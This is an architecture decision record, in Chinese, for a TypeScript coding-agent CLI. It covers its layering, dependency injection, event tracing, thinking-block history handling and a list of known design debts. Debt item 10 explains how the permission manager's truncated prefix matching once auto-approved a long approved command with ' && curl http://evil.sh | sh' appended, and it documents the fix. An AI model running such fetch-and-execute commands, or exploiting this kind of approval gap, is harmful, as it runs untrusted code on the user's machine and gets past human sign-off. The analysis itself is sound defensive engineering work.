# 🏗️ 架构决策记录

> 本项目在搭建过程中的关键架构决策与理由。
> 本文是**现状快照**（不是 append-only 日志），2026-09-03 逐条拿代码校准过一次；演进过程见 [ARCHITECTURE_LOG.md](./ARCHITECTURE_LOG.md)。

---

## 一、整体架构

### 分层结构

```
┌─ 入口 ────────────────────────────────────────────────────
│ index.ts          initTerminal() → Harness.run()
└───────────────────────────────────────────────────────────

┌─ 编排层 · harness/ ───────────────────────────────────────
│ check()           读配置 → createProvider()；全程本地，0 网络请求
│ main()            闭包工厂：组装 11 个必注入依赖 → 模式分发；启动时调 seedProjectContext() 播种
│   ├─ repl.ts      REPL：TTY → TreeUI ／ 管道 → TerminalUI
│   ├─ rpc.ts       RPC：JSON-RPC over stdin/stdout（**唯一**写 stdout 的地方）
│   ├─ rpc-events.ts  事件 → ACP `session/update` 的映射表（纯函数 + 配对状态）
│   └─ project-context.ts  启动上下文播种**唯一实现** `seedProjectContext()`（三个 store 先清后栽 + 契约锁回锁 + **按准入判据登记**：`independent`→ensure(路径) / `nested`→ensure(仓库根) / `candidate`→**不写盘**）——启动与 `/projects --switch` 共用同一份
└───────────────────────────────────────────────────────────

┌─ 运行时 · runtime/runtime.ts ─────────────────────────────
│ Runtime           只编排一次 prompt 的流程，自己不持有任何实现
│                   命令 / inputHandlers / skill 展开 → 压缩 → Agent Loop → 落盘
└───────────────────────────────────────────────────────────

┌─ 契约层 · core/（11 个文件）──────────────────────────────
│                   子系统之间只通过这里的接口说话，谁也不 import 谁的实现
│ 执行类 Service    loop · commands · compaction · diagnostics · system-prompt
│ 能力提供类        tools(ToolProvider) · permission(PermissionProvider)
│ 数据类            storage(SessionStorage) · compaction-store
│                   events(EventBus + Span 打卡契约 + SpanCollector 收段契约)
│ 扩展契约          extension（三类 ctx 各自能拿到什么，见下"扩展三口子"）
└───────────────────────────────────────────────────────────

┌─ 子系统实现（一目录一个，互不 import）────────────────────
│ loop/             AgentLoopServiceImpl —— LLM 流式 + 工具执行的循环
│ session/          JsonlSessionStorage（entry 树 + leaf 指针 + fork；getMessages 视图裁剪）· InMemory · Mock
│                   + JsonlSessionRepo —— 会话仓库层（目录级 list/open/create/remove，core/session-repo 契约；
│                     删除两层守卫：文件名白名单拒穿越 + Runtime 拒删当前活跃会话）
│ tools/            ToolRegistry + spec.ts（参数规格：一份定义派生 Schema / 运行时校验 / 入参类型）
│                   + 14 个内置工具（ls / read / write / edit / grep / bash / todo / memory / record_event / search_events / pull_events / ask / archive / git）
│ todo/             TaskStore —— 任务清单的内存真相源（render/parse 互逆 + TASK.md 投影/种子；层级 / 依赖 / 会话内时间戳）
│ memory/           MemoryStore —— 项目记忆的内存真相源（render/parse 互逆 + .flint/memory.md 投影/种子）
│ eventlog/         EventStore —— 历史事件库（.flint/events.jsonl 追加档案 + 检索；tool_call span 自动捕获）
│ project/          项目生命周期协议（charter.ts 目标契约写保护闸 · roadmap.ts 路线图表契约 + 分段编号与状态派生
│                   · lifecycle.ts DEVLOG 排版与归档回执 · snapshot.ts PROJECT.md 只读注入）· fork.ts 分叉点提问
│                   · postcheck.ts 改完自检（登记表驱动，`commands` 数组；启动采**基线**后只报新增诊断；结论追加进工具结果，不改工具状态）
│                   · gitignore.ts `.gitignore` 感知（解析成跳过规则；跳过表 = 内置默认 ∪ .gitignore）
│                   · commands.ts 项目命令注册表（从 package.json 的 scripts 发现并注入；**发现 ≠ 授权**，不执行任何命令）
│                   · projects.ts `/projects` 列表·切换·新增的**纯逻辑**（参数解析含 `--add` / 选项目【重名不猜】/ 排序 / 列表·回执·登记提示·`--add` 回执渲染；执行在命令层，播种走 harness/project-context.ts）
│                   · detect.ts **项目准入判据**（**零 import**：逐条判 硬排除 → 实物档案 → git 仓库根 → 清单文件 → 候选，`nested` 归并到仓库根、`candidate` **不写盘**）
│                   · probe.ts 探测层（**全项目唯一**碰 fs / 起子进程处；`gitRoot` 是**惰性回调**，判据不碰盘、探测不判事）
│ git/              git 只读结构化（git.ts：op 白名单 + argv 不经 shell + 8 个 op 的解析渲染）· route.ts bash 裸 git 只读命令的路由（**不是闸**）
│ process/          子进程**整树终止**（proctree.ts 纯策略：Windows taskkill /T · POSIX 负 pid 进程组 · 失败分类；runner.ts 执行器：异步 spawn + 超时按树杀 + 宽限期兜底）——`bash` 与改完自检**两处共用**
│ permission/       PermissionManager
│ context/          CompactionServiceImpl · SystemPromptService · 扩展装载器 · 内置段落
│ commands/         CommandServiceImpl + 14 个内置命令（含 /memory /events /charter /projects）
│ diagnostics/      DiagnosticsServiceImpl
│ config/           ConfigManager（配置分层 + 供应商注册表 + 模型列表预热/新鲜期）
│ llm/              createProvider() 工厂 → AnthropicProvider（provider === 'anthropic'）
│                                          → DeepSeekProvider（其余一律，OpenAI 兼容）
│                   OllamaProvider 仍只是注释里的愿景，没有实现
└───────────────────────────────────────────────────────────

┌─ 交互层 · io/ ────────────────────────────────────────────
│ terminal.ts       stdin/stdout（readLine / initTerminal / readLineWithMode）
│ ui/tree-ui.ts     TreeUI：TTY 组件树（Container / Text / SelectList）
│ ui/screen.ts      Screen：行数组快照 + 差分渲染
│ ui/index.ts       TerminalUI：管道模式轻量文本
│ ui/input-handler.ts  InputHandler：raw mode 逐键解析
│ ui/task-panel.ts  常驻任务面板渲染（纯函数：完成 ✓ / 进行中 ▶ / 待办 ☐）
│                   ← 直读 todo/store.ts，不经 EventBus（todo 工具拿不到总线）
└───────────────────────────────────────────────────────────
```

### 两条横切旁路（不在调用链上，挂在 EventBus 上）

```
扩展三口子 · src/extensions/（context/extension-loader.ts 自动扫描装载）
  sections/   加系统提示词段落    export registerSections   ctx = { addSection }
  hooks/      可改写流程          export registerHooks      ctx = { on, events }
  watchers/   只旁观不改流程      export registerWatchers   ctx = { events }
                                  ↑ 拿不到 on 是类型层面的约束，verify-extensions 用探针法坐实

观测 · runtime/events.ts + runtime/span-collector.ts
  生产端（runtime / loop / context）
    ├─ events.emit(...)              → 离散事件（UI 的"画面"）
    └─ events.trace() / beginSpan()  → 成对 span（观测的"账本"，结构保证配对 + durationMs）
         ↓ PromptEventEmitter 统一盖 at / seq / turnId
  订阅者并列、互不干扰：
    ├─ TreeUI / TerminalUI                    ← 画面
    ├─ SpanCollector 实例一 → /traces 命令    ← 就地看最近段耗时/成败/正在跑
    ├─ SpanCollector 实例二 → watchers/trace-log.ts → trace.jsonl（FLINT_TRACE=1 开）
    └─ SpanCollector 实例三 → eventlog/store.ts → .flint/events.jsonl（tool_call 段自动记入事件库）
       三个实例共用 span-collector.ts 这一份配对代码：任一关掉不影响其他两个
```

### 为什么分层？

每层替换不影响其他层：

- 换交互方式（CLI → WebSocket → HTTP）只在 `harness/` 加一个模式文件，不动 Runtime
- 换 LLM 厂商只加一个新 Provider 实现 + `llm/index.ts` 工厂里一个分支，不动 Runtime
- 换存储后端只加一个新 `SessionStorage` 实现（**但注意下面"已知架构债"第 1 条**）
- 加观测消费者只多订阅一次 EventBus，生产端一行不改

---

## 二、核心决策

### 决策 1：Pi 模式（调用方持有循环）

**选择：** Runtime 不持有 `while(true)`，循环在调用方手里。

**现状：** 循环定义在 `harness/repl.ts` 的 `runReplMode()`（**不在 `main.ts`**——`main.ts` 只做模式分发与依赖组装）；RPC 模式的循环在 `harness/rpc.ts`，按请求驱动。

**理由：**
- 调用方控制节奏，Runtime 保持纯粹（只管 `prompt`）
- 可无缝切换 I/O 模式（REPL → RPC → WebSocket）
- 测试容易——单次 `runtime.prompt()` 调用不依赖循环上下文

**代价：** 每加一种交互模式就要再写一份循环样板（现在已有 repl / rpc 两份）。

参见：GLOSSARY [Pi 模式](./GLOSSARY.md#pi-模式)

### 决策 2：构造函数注入

**选择：** Runtime 的依赖通过构造函数传入，不内部读取文件。

**现状：** `RuntimeOptions` 有 **11 个必注入**（无默认值，全部由 `harness/main.ts` 显式组装）：`llm`、`session`、`tools`、`permission`、`skills`、`events`、`spanCollector`、`commandSystem`、`diagnosticsService`、`compaction`、`systemPromptService`。可选的是 `mode`、`model`/`provider`/`baseUrl`、`thinking`、`services`（仍是 `unknown`，标着 TODO）。

**理由：**
- 依赖来源清晰，不藏隐式文件读取
- 测试时直接注入替身，不需要 mock 文件系统

**代价：** 调用方需要先组装 11 个依赖再传进去，`main.ts` 的组装段落随子系统增加而变长。

### 决策 3：接口先行（SessionStorage / LLMProvider）

**选择：** 子系统之间一律先定接口再写实现，接口集中在 `src/core/`。

**现状：** `core/` 已有 11 个契约文件（见上图）。三类命名约定：执行类叫 `*Service`、能力提供类叫 `*Provider`、数据类叫 `*Storage` / `*Store` / `*Bus`。

**理由：**
- 替换实现不需要改调用代码（InMemorySession → JsonlSessionStorage）
- 测试可注入替身
- 预留多种接入方式（DeepSeek → Anthropic 已兑现）

**代价：** 初期多一批接口文件；**而且接口一旦重名就会出事**——见"已知架构债"第 1 条。

### 决策 4：check() 统一读取配置

**选择：** 所有配置读取和 Provider 创建集中在 `harness/check.ts` 中，结果通过 `CheckResult` 传给后续环节。

**现状：** 启动关键路径已做到 **0 网络请求**（2026-09-02 启动提速第二档）——模型列表改为界面渲染前 fire-and-forget 内存预热，`/model` 二级展开前才 `ensureModels`（5 分钟新鲜期内零等待，还在飞则复用在飞 promise）；网络连通探测本就在后台。实测 `check()` 从 760ms 降到 0.7ms。

**理由：**
- 配置错误在启动时即暴露，而非运行时才报错
- 单一配置入口，不散落 `readFileSync` 在各模块中
- 配置验证结果可被多个消费者复用

**代价：** check() 必须返回一个 Result 对象，调用链多一层。

### 决策 5：Streaming 以回调方式提供

**选择：** `prompt()` 保留返回完整文本的能力，同时通过可选 `onToken` 参数支持流式。

**现状（这条已被事件系统取代，签名保留）：** 真实签名是 `prompt(input, onToken?, streamingBehavior = 'followUp')`，但**三个调用点全都不传 `onToken`**——`repl.ts` 与 `rpc.ts` 只传 input，`tree-ui.ts` 甚至显式写 `undefined` 跳过它去传第三个参数。UI 联动实际全部走 EventBus 订阅。Runtime 内部个别分支仍会调它（插入 steer 消息时回一句提示），所以它没死，只是**没人从外面接**。

`streamingBehavior='steer'` 走**两级消费**：第一级在 `AgentLoop` 的工具边界（`opts.takeSteer`，工具跑完、下一次 `llm.stream()` 之前取件，追加进最后一条 tool 结果 → **本轮内**生效）；第一级不适用时（本轮无工具调用、或已是最后一轮）退回第二级，由外层循环当新一回合处理（退化成高优先级 followUp）。两级都不 abort 在飞的流——硬打断仍需 `AbortSignal`，属【预留】。

**理由（当初）：**
- 向后兼容——不传 `onToken` 时行为与旧版一致
- 调用方自由选择流式或非流式
- 简单场景（如 RPC 模式）不需要流式，可以不传

**代价：** 函数签名比纯事件模式更复杂，且现在多了一个没人用的可选参数——**新代码不应再用它，走事件订阅**。

### 决策 6：不做 DI 容器

**选择：** `main.ts` 显式手动组装依赖，不使用 IoC 容器。

**理由：**
- 项目规模小（<10 个模块），手动组装完全可控
- 没有"依赖链的依赖链"需要容器解决
- DI 容器增加隐式查找（"这个 Service 从哪来的？"）

**代价：** 模块数量增长到 20+ 时，可能需要重新评估。

**现状：重新评估的条件已经触发**——`src/` 下 14 个目录、70 个 `.ts` 文件，`main.ts` 要组装 11 个必注入依赖。但结论仍是**不做**：组装点只有一处、从上到下一屏能读完，比容器的隐式查找更好查错。真要减负，先做的是把组装段落抽成一个 `createRuntime()` 工厂函数（已经这么做了），而不是引容器。

### 决策 7：Anthropic 思考块永不落盘，请求侧按 thinking 开关分叉（2026-09-12，方案 B）

**背景（约束从哪来）：** 扩展思考开启时，模型的每条 assistant 回复在正文之前多出一段**思考块**（`ThinkingBlock` = 推理文本 + Anthropic 加密签名，见 [GLOSSARY](./GLOSSARY.md#thinking思维链)）。它是**协议数据而非展示内容**：只要本次请求开着 thinking，历史里每条 assistant 消息都必须**一字不改**地带回配对的思考块（签名校验），否则整条请求被 400 拒收。

**选择：** `thinkingBlocks` **永不落盘**（`MessageEntry` 没有这个字段），代价由请求侧偿还——`runtime.ts` 组装历史时按 `thinkingOn` 分叉：

- **thinking 关**（或 auto 且本轮未激活）→ 历史里存什么形状就回传什么形状：assistant 带 `tool_calls`、tool 带 `tool_call_id`/`name` 全量结构化回传。没人要求你带思考块，协议天然合法。
- **thinking 开** → **降级转写**（见 [GLOSSARY：降级视图](./GLOSSARY.md#降级视图thinking-on-的历史形态)）：tool 结果改写成 `[工具 X 结果] …` 的 user 文本，纯工具调用的空 assistant 轮剔除（空内容消息两条协议都不收，孤儿 tool 消息丢了配对 id 同样不收）。**转写不是过滤**——工具看到过的信息一个字不少，只是从结构化字段变成对话文本。
- 降级后会产生相邻的连续 user 消息，由 `anthropic.ts` 的 `toAnthropicMessages` 做**同角色相邻归并**消化。归并放在适配器而非 runtime：它是**幂等的**——服务端本会合并时无害，服务端真拒绝时救命，两种世界里都正确。
- `resolveAnthropicThinking` 安全阀**原样保留**当兜底：任何漏网的无块结构化历史被它拦下（静默降级为不开 thinking），而不是变成一次 400。

**理由：**
- **为什么不落盘**：落盘意味着契约（`MessageEntry`）、三个存储后端、压缩子系统全要跟着动，改动面大；且思考块又长又贵，复用价值只落在"下一次请求恰好还开着 thinking"这一个场景。
- **为什么分叉而不是二选一**：结构化回传与 thinking 开启互斥，但这两种场景各有真实价值——关 thinking 时模型看得到上一轮真实调过什么工具（跨轮工具记忆），开 thinking 时保住推理质量。分叉让两者各取所得。
- **为什么判定在请求时、不在落盘时**：磁盘上永远只有**一份全量历史**，两种视图都是它的投影。存两份迟早漂移。

**代价：** thinking 开启的会话里，跨轮看到的是转写文本而非原始结构；OpenAI 兼容路径原样透传，会真的发出连续 user（标准语义容忍，风险低，`verify-steering` 的 S10 钉住）。

**现状与将来：** 行为证明在 `verify-history-structured.ts`（分叉两路 / 落盘还原 / turnLog 上交）与 `verify-session.ts` ⑨ 段；历史包袱的来龙去脉见第四节第 9 条。

**补记（2026-09-12 晚，核对官方文档后）：跨轮回传义务其实不存在。** 官方原话（docs.anthropic.com，区域屏蔽下经 AWS Bedrock 等镜像逐字核对）："It is only strictly necessary to send back thinking blocks when using tools with extended thinking. Otherwise you can omit thinking blocks from previous turns, or let the API strip them for you if you pass them back."；"the API automatically ignores thinking blocks from previous turns and they are not included when calculating context usage"。三个推论：
- 协议只硬性要求**当前工具循环**内的块（"Required: within a tool-use turn … Allowed: outside tool use, omit prior turns' thinking."）——flint 的这些块活在单次 `run()` 的内存消息链上，本来就没丢。跨轮落盘（原"方案 A"设想）是在给 API 不要的东西付工程成本。
- 历史带 `tool_calls` 而无块时，API 的真实行为不是 400 而是**静默关 thinking**（"the API may … disable thinking when the conversation history is incompatible with thinking being enabled"）——这正是安全阀刻意替用户避免的。降级转写的价值由此坐实：让历史**兼容** thinking 开启，而不只是免于报错。
- 缓存：存储布局与缓存命中无关（缓存认的是请求前缀字节序列）；真正动缓存的是 thinking 参数变化本身（"Changes to thinking parameters invalidate cached prompt prefixes that include messages"，system prompt 缓存幸免）——on↔off 切换本来就会失效一次，与块落不落盘无关。

---

## 三、对比参考

### 与 Pi Agent 架构的区别

| 维度 | Pi | 本项目（2026-09-04 现状） |
|------|----|--------|
| 循环所有权 | InteractiveMode 持有 | `harness/repl.ts` 的 `runReplMode()` 持有 |
| 事件系统 | subscribe/emit 全链路 | **已落地**：EventBus + 统一盖 `at`/`seq`/`turnId` + 骨架 span / 便签 span 双通道（`onToken` 签名保留但无人传） |
| 会话模型 | 树形分支（可 /fork） | **已落地**：`JsonlSessionStorage` entry 树（`id` + `parentId`）+ leaf 指针 + `/history` fork（复制前缀到新文件，原文件不动） |
| 扩展机制 | 完整的 Extension 插件体系 | **已落地三类口子**：sections / hooks / watchers，`extension-loader` 自动扫描装载 |
| 配置 | 分层 SettingsManager（全局/项目/会话） | **部分落地**：密钥分三层（环境变量 > 全局 `~/.flint/config.json` > 项目 `config/provider-keys.json`），其余配置项还没分层（`config/manager.ts` 里标着 TODO） |
| 观测 | docs/observability.md | **已落地**：SpanCollector 公共配对件 + `/traces` 内置命令 + `trace.jsonl` 落盘；不引 LangSmith / LangFuse 这类外部服务 |
| 测试 | vitest 全套 | **路线不同、且已定调**：零依赖验证脚本（`npm run verify` 串跑）+ 1 个真实链路冒烟；无框架、无覆盖率、无 CI。**套数与项数不在此重述**——那是"算得出来的事实"，唯一口径在 [TESTING.md](./TESTING.md)（且其中的统计句已交给生成区，见 `npm run docs:sync`）。`run-verify.mjs` 末尾还会拿汇总的真值核对 `Log/` 里写的「当前值」（`check-doc-numbers.mjs`：白名单 + 生成区两块）。“引入 vitest”的待办已于 2026-09-03 关闭，取舍见 [DECISION_LOG.md](./DECISION_LOG.md) 与 [TESTING.md](./TESTING.md) |

---

## 四、已知架构债

> 2026-09-03 校准文档时查出 7 条，**同日下午已处理 4 条**（下面标 ✅，保留原状描述以便回溯“当初为何算债”）；剩 3 条仍成立；另在修第 7 条时又查出 1 条（第 8 条）。2026-09-04 修正一批文档失真时又查出 1 条（第 9 条）；同日实现 `edit` 工具时又查出 1 条（第 10 条），**同日晚些时候单独一轮修掉了第 10 条**。2026-09-10 落地内层引导（steering）时登记第 11 条（刻意取舍，非遗漏），**同日晚些时候单独一轮把它修掉**，并顺带核查推翻了它的一半前提（见第 11 条）。现共 11 条：6 条 ✅、5 条仍成立（第 3 / 4 / 6 / 8 / 9 条）。同日深夜给 `grep` / `bash` 建功能专套时又查出两个缺陷（`grep` 在 Windows 上完全不可用、且把“命令跑不起来”谎报成“没有匹配”；`bash` 硬编码 GBK 解码使外部程序的中文输出全乱码），两者已修——但它们是**实现 bug 而非架构债**，故不计入本表，详情见 [ARCHITECTURE_LOG.md](./ARCHITECTURE_LOG.md) 同日 23:53 那块。

1. ✅ **两个同名 `SessionStorage` 接口，注释还互相矛盾**（已收敛）
   - 原状：`core/storage.ts` 版有三必需方法 + 三可选成员（`getAllStored?` / `forkTo?` / `getDir?`），注释说“这样 Runtime **无需 instanceof** 判断”，三个实现 implements 的是这一版；`types.ts` 版只有三必需方法，注释说“Runtime **通过 instanceof 分支调用**”，而 `RuntimeOptions.session` 声明的是这一版——于是可选成员在接口层面拿不到，`runtime.ts` 里只能写 `if (this.session instanceof JsonlSessionStorage)`。
   - 怎么修的：`types.ts` 改成只做转发（`export type { SessionStorage, StoredMessage } from './core/storage.js'`），`RuntimeOptions.session` 直指 core 版；`runtime.ts` 四处 instanceof 换成**能力探测**（`if (this.session?.getAllStored)`）。等价性的根据：那四处调的正好就是三个可选成员，而三个实现里只有 Jsonl 有这三个成员。“探测 ≡ instanceof”的 3×3 穷举对比已固化为断言（`verify-session.ts` ③ 段 9 项）。

2. ✅ **`AgentConfig` 是死类型**（已删）。原状：`types.ts` 里留着它（name / version）和一句“调用方：agent.ts”的注释，而该文件从未存在、全项目无人 import。删前核实过全库引用只有 1 处，就是它自己的定义。

3. **`Provider`（供应商元数据）与 `LLMProvider`（调用抽象）同名易混。** 前者在 `llm/provider.ts`（显示名 + 模型列表 + `getApiKey`/`fetchModels`，由 `ProviderRegistry` 持有），后者在 `llm/types.ts`（`chat()` / `stream()`）。真正的工厂是 `llm/index.ts` 的 `createProvider(config)`。

4. **压缩用量没回流。** `context/compaction.ts` 走非流式 `llm.chat()`，而 `ChatResult` 没有 usage 字段，全文件也没有 `usage` 字样 → 压缩消耗的 token 从未计入 `/usage` 的合计。**本轮判定不做**：要改就得改 `ChatResult` 的形状，牵连两个 provider 的非流式路径 + `stream-helper` + 多套 verify 脚本，是独立的一件事（已记在 ROADMAP P6 “可观测性增强”的剩余项里）。

5. ✅ **`package.json` 的工程化缺口**（已补）。原状：没有 verify / test 入口（10 套脚本只能手工循环跑）；`clean` 写的是 `rm -rf dist`，Windows 下根本跑不通。现有 `verify`（`run-verify.mjs` 串跑**全部**验证套件；2026-09-11 起末尾还会核对 `Log/` 里写的数字，漂移计入退出码）/ `docs:sync`（`docs-sync.mjs`，把实测真值写进 `Log/` 的生成区——见 TESTING 第二节）/ `typecheck` / `clean`（`clean.mjs` 用 `fs.rmSync` 跨平台删 dist）四个入口，四个都实测跑通。

6. **`scripts/` 不受 tsc 检查。** `tsconfig.json` 的 `include` 只有 `["src/**/*.ts"]`。这是有意的取舍（脚本要造替身、塞假字段），代价是脚本必须真跑才算验过。

7. ✅ **演示文件与空目录**（部分处理）。`runtime/input-handler-demo.ts` **已删**（连同 `main.ts` 里的 import 与注册）——它会静默吞掉 `@@` 开头的输入、把 `/ask ` 转成加问号，属**未文档化的魔法行为却挂在生产路径上**；`runtime.onInput()` 这个能力本身保留，给 ROADMAP 里的 Hook 系统。`src/runtime/commands/` 空目录**仍在**：git 本来就不跟踪空目录，所以仓库里不存在它，只是本地残留。

8. **`InputHandler` 同名冲突**（修第 7 条时查出）。`runtime.ts` 导出的是**函数类型** `type InputHandler = (text: string) => InputEventResult | Promise<...>`（输入预处理器），`io/ui/input-handler.ts` 导出的是**类** `class InputHandler`（raw mode 逐键解析）。删掉 demo 前，`main.ts` 里两者相隔两行同时出现（一行用函数类型注册、下一行注释在说那个类），同一段代码里两个含义混用。这是项目里第三组同名混淆（前两组：两个 `SessionStorage`——本日已收敛；`Provider` vs `LLMProvider`——仍成立，见第 3 条）。未改，只在两处各加了注释互指。

9. ✅ **`tool_calls` 持久化曾是双向死路**（2026-09-04 修文档失真时查出；**2026-09-12 按方案 B 接通**，下面原状保留以便回溯）。
   - **怎么接通的**（`core/loop.ts` / `loop/agent-loop.ts` / `runtime.ts`）：agent-loop 以 `turnLog` 切片上交本轮生成的中间消息（assistant+tool_calls / tool 结果，最终回复不在其中），runtime 逐条带 `extra` 落盘（顺序：user → steers → turnLog → 最终回复）。**请求侧按 thinking 开关分叉**：thinking 关（或 auto 未激活）→ 历史全量结构化回传，跨轮工具可见；thinking 开 → 降级纯文本（tool 结果转 user 文本、纯工具调用的空 assistant 轮剔除），因为 `thinkingBlocks` 永不落盘（`MessageEntry` 无此字段），透传结构化历史会让 `resolveAnthropicThinking` 安全阀把 extended thinking 静默全程关掉。安全阀原样保留当兜底。这就是"方案 B"——落盘 thinking 块的全保真方案留作将来的增量。
   - **为什么 thinking-on 分支不能原样丢**：降级视图里孤儿 `tool` 消息（丢了 `tool_call_id`）与空文本 assistant 消息两条协议都不收——所以降级是"转写"不是"过滤"。
   - **引导落盘的时序说明**：steer 的独立 user 条目落在本轮工具循环**之前**（runtime 只有"本轮内被吸收"这一个时刻，拿不到循环内的精确位置）；真实时序由 agent-loop 原地追加进 tool 结果的 `[用户引导]` 文本承载，两份记录并存。
   - **原状**（2026-09-04 ~ 2026-09-12）：
     - **格式支持**：`MessageEntry` 声明了 `tool_calls?` / `tool_call_id?` / `name?`，`appendMessage(role, content, extra?)` 能写，`getMessages()` 会还原。所以“会话存储只存纯文本”这个流传很广的说法是**错的**。
     - **入口未接线**：runtime 落盘只传 `role + content`；agent-loop 一处 `appendMessage` 都没有。结构化字段从未被写进任何会话文件。
     - **出口被堵**：`runtime.ts` 组装 `toolMessages` 时 `history.map((m) => ({ role, content }))`，把 `getMessages()` 刚还原的 `tool_calls` 又丢掉。
     - **为何不能直接“修好”出口**：一旦透传历史 `tool_calls`，任何有过工具调用的会话都会让 extended thinking 被**静默全程关闭**——看上去像“修好了历史保真度”，实际是拿推理能力换了它。
     - 当时行为一行未改，只固化断言（`verify-session.ts` ⑨ 段）；接通后该段 C/D 组断言已随新语义更新，另有 `verify-history-structured.ts` 全套行为证明。

10. ✅ **`PermissionManager` 的前缀匹配同时“过窄”和“过宽”，而注释描述的那个 detail 格式没有任何调用方产生过**（2026-09-04 实现 `edit` 工具时查出，同日晚些时候已修；下面四段是原状，保留以便回溯）。
   - **过窄（声称的能力从未生效）**：`permission/manager.ts` 的注释举例“用户选了‘本次全部允许’ `write:src/` → 后续检查 `write:src/data.txt` 时 `key.startsWith(prefix)` 命中 → 自动放行”，并据此总结“授权了一个目录，该目录下所有文件自动放行”。但唯一的真实调用方 `agent-loop.ts` 传的是 `JSON.stringify(args).slice(0, 80)`，形如 `write:{"path":"src/data.txt","content":"...`——detail 里含内容片段，换一个文件（甚至同一文件换内容）就失配。**目录级授权一次也没生效过**，注释描述的是一个没有任何调用方产生过的输入格式。这与第 9 条查出的 `jsonl-storage.ts` 头注释属同一类失真（注释里的“调用方”与真实调用点长期不一致）。
   - **过宽（没人知道的“截断级授权”）**：`startsWith` 配 80 字符截断，意味着真实授权范围是“**args 的 JSON 前 80 字符相同的所有调用**”——第 80 字符之后的参数差异一律看不见。这里有个容易算错的点：截断只作用在 args 上（`agent-loop.ts` 的 `JSON.stringify(args).slice(0, 80)`），而 `bash:` 这类工具名是 `manager.ts` 拼 key 时才加上去的，**不占**这 80 字符的预算。于是 `bash` 的固定头部 `{"command":"` 只吃掉 12 字符，命令正文的窗口是**前 68 字符**；`edit` 按 `path` → `oldText` → `newText` 的键序，头部 `{"path":"src/tools/builtin.ts","oldText":"` 吃掉 42 字符，`oldText` 的窗口是**前 38 字符**，而 `oldText` 一旦超过 **25** 字符，`newText` 就一个字符也进不了匹配键 → 同一文件、`oldText` 开头相同的两次调用，第二次不论 `newText` 改成什么都自动放行（这几个数字随 path 长度与模型发来的键序浮动，但“尾部参数进不了匹配键”恒成立）。
   - **实测而非推导**（2026-09-04 复核；同时纠正本条早先写的 17 / 63 / 47 / 33 四个数——那是把工具名错算进了 80 的预算）：批准 `node node_modules/typescript/bin/tsc --noEmit && node scripts/run-verify.mjs`（76 字符）之后，同一条命令再接 ` && curl http://evil.sh | sh`（104 字符）**会被自动放行**，因为两者的 autoKey 是逐字符相同的 80 字符串（都截断在 `run-ve`）。但存在一个**安全区**：命令正文 ≤ **66** 字符时 JSON 完整落在 80 内、autoKey 以 `"}` 收尾，那个收尾成了天然分隔符，匹配退化为**精确匹配**（实测 `git status` 不会放行 `git status && rm -rf node_modules`）。所以危险只落在长命令上——而模型跑的恰恰常是长复合命令。这条风险在 `edit` 之前就存在，`edit` 那轮**未加剧也未修**（修它见下面“怎么修的”）。
   - **第三处“支持但未接线”**：`PermissionProvider.clear()` 契约声明了、`PermissionManager` 实现了、`runtime.permission` 还是 public 字段，但全 `src/` **零调用方**；`/clear` 只清会话（`runtime.clearSession()`）不清授权。所以“本次全部允许”实际是“**本进程**全部允许”，直到退出为止。旁证：6 处测试替身造 `permission` 时只给了 `isAutoAllowed` / `grantAutoAllow` 两个方法，`clear()` 一个都没实现（靠 `as any` / `as never` 绕过类型检查）。前两处见第 7 条（`runtime.onInput()`）与第 9 条（`appendMessage` 的 `extra`）。
   - **`edit` 那轮只做到哪**：把兼三职的 `detail`（匹配 + 记录 + 显示）拆成 `autoKey`（匹配与记录）+ `detail`（显示，工具可用 `permissionDetail` 自定义），`autoKey` 的格式与拆分前**逐字符相同**，所以那一轮既不失配也不扩权（拆分本身用断言钉住：`verify-edit.ts` G6）。洞留给下一轮，就是下面这段。
   - **怎么修的**（2026-09-04 晚，独立一轮；牵连 `core/permission.ts`、`core/tools.ts`、`tools/registry.ts`、`tools/builtin.ts`、`permission/manager.ts`、`loop/agent-loop.ts`、`runtime.ts`、`commands/builtin/clear.ts`）：
     - **授权边界交给工具定义**：`core/tools.ts` 再加一个**可选**成员 `permissionKey?`（与 `permissionDetail?` 同一手法——加必需成员会打坏 7 处 ToolProvider 替身 ⚠ 2026-09-06 复核：这半句两个成分都不准——替身现为 **9** 处（多的 2 处是 09-05 为 A4/A5 新加的 `invalidTools` / `noMatchTools`），而“会打坏”在本仓库**无法用 tsc 验证**：实测把 `ToolDefinition.parse` 从可选改成必需，`tsc --noEmit` 仍 0 错误，因为 `scripts/` 根本不进类型检查（第 6 条）。这类数字只能逐处数，见 [TESTING.md](./TESTING.md)），`registry.ts` 转发。三个需确认的工具各给一个键：`write` / `edit` 是归一化后的路径（反斜杠→正斜杠，**刻意不含** `content` / `oldText` / `newText`），`bash` 是**完整命令**（一字不截）
     - **截断没了**：`agent-loop.ts` 的 `autoKey` 兜底从 `argsJson.slice(0, 80)` 改成**完整** `argsJson`；`detail` 仍截 80（弹窗标题只有 1 行）。两个变量的截断策略**刻意相反**，承重注释写在调用点（防后人“为了一致”把它们对齐）
     - **前缀匹配换成精确匹配**：`manager.ts` 的 `autoAllowed` 从 `string[]` + `some((prefix) => key.startsWith(prefix))` 换成 `Set<string>` + `has()`；`core/permission.ts` 的参数名 `detail` → `authKey`（detail 在本项目专指弹窗文案，同名正是当初混淆的根源）
     - **`clear()` 接线**：`runtime.clearSession()` 清历史时连带 `this.permission.clear()`；`/clear` 的说明改成“清空当前会话与本次工具授权”、回执写明授权一并撤销——“本次”终于等于本次会话

11. ✅ **内层引导的文本不落会话历史**（2026-09-10 落地内层引导时登记，**同日晚些时候单独一轮修掉**；下面保留原状以便回溯）。
   - **原状**：`steerQueue` 的消息在 `AgentLoop` 的工具边界被取走、追加进最后一条 tool 结果的 content（[ARCHITECTURE_LOG.md](./ARCHITECTURE_LOG.md) 同日 19:01 那块）之后就没了——只活在本次请求的 `toolMessages` 里，`/history` 与下一次请求的历史都看不到它，模型下一轮只知道“最终答案是什么”，不知道用户中途改过方向。
